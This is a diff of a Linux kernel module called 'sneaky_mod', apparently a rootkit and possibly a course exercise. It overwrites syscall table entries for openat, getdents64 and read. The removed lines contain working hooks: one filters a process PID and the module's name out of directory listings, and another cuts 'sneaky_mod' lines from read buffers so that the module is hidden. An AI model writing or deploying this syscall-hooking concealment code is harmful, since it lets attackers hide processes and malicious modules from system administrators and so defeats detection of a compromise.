@@ -82,40 +82,6 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
-// asmlinkage int fake_getdents64(struct pt_regs *regs)
-// {
-//   int res;
-//   struct linux_dirent64 *dirp, *cur_dirp;
-//   long bytes_len;
-//   char *next_dirp;
-//   char sneaky_process_name[16];
-
-//   res = (*original_getdents64)(regs);
-//   if (res <= 0)
-//   {
-//     return res;
-//   }
-//   dirp = (struct linux_dirent64 *)regs->si;
-//   bytes_len = res;
-
-//   while (bytes_len > 0)
-//   {
-//     cur_dirp = dirp;
-//     next_dirp = (char *)dirp + dirp->d_reclen;
-//     bytes_len -= dirp->d_reclen;
-//     // Check if the d_name should be hidden
-//     sprintf(sneaky_process_name, "%d", pid);
-
-//     if (strcmp(sneaky_process_name, cur_dirp->d_name) == 0 || strcmp("sneaky_mod", cur_dirp->d_name) == 0)
-//     {
-//       memmove(cur_dirp, next_dirp, bytes_len);
-//       res -= cur_dirp->d_reclen;
-//       continue;
-//     }
-//     dirp = (struct linux_dirent64 *)next_dirp;
-//   }
-//   return res;
-// }
 
 asmlinkage int fake_getdents64(struct pt_regs *regs)
 {
@@ -172,26 +138,6 @@ asmlinkage ssize_t fake_read(struct pt_regs *regs)
   return res_proc;
 }
 
-asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
-{
-  ssize_t bytesRead = (*original_read)(regs);
-
-  if (bytesRead > 0)
-  {
-    void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
-    if (posStart != NULL)
-    {
-      void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
-      if (posEnd != NULL)
-      {
-        int size = posEnd - posStart + 1;
-        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
-        bytesRead -= size;
-      }
-    }
-  }
-  return bytesRead;
-}
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -215,8 +161,8 @@ static int initialize_sneaky_module(void)
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)fake_getdents64;
-  // sys_call_table[__NR_read] = (unsigned long)fake_read;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  sys_call_table[__NR_read] = (unsigned long)fake_read;
+  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
 
